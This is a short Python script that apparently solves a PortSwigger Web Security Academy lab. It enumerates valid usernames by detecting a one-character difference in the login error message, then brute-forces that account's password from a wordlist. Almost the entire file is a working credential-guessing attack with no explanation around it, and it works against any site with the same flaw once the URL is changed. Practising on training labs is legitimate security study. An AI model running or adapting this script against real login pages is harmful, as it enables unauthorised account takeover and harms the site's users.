import requests
from bs4 import BeautifulSoup


login_url = 'https://0a5a00a803c7b5e4807f173d00fb00a7.web-security-academy.net/login'

def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()
        

usernames = readFile("usernames.txt")
passwords = readFile("passwords.txt")

# info adm user accounting ak amarillo an ap
# an user
right_username = "" 

print("Finding username - started")
for username in usernames:
    loginData = {"username": username, 
                "password":  "12345"}
    response = requests.post(login_url, loginData)
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.select_one('.is-warning').get_text(strip=True)
    print(token)
    if "Invalid username or password" == token: #Invalid username doesn't contain a period in the end of the error message
            right_username = username
            print(f"Right Username: {right_username}")
            break
print("Finding username - finished")


print("Finding password - started")
for password in passwords:
    loginData = {"username": right_username, 
                "password":  password}
    response = requests.post(login_url, loginData)
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.select_one('.is-warning')
    if not token:
        print(f"Right combination - Username: {right_username} & password: {password}")
        break
print("Finding password - finished")

print("Finished")



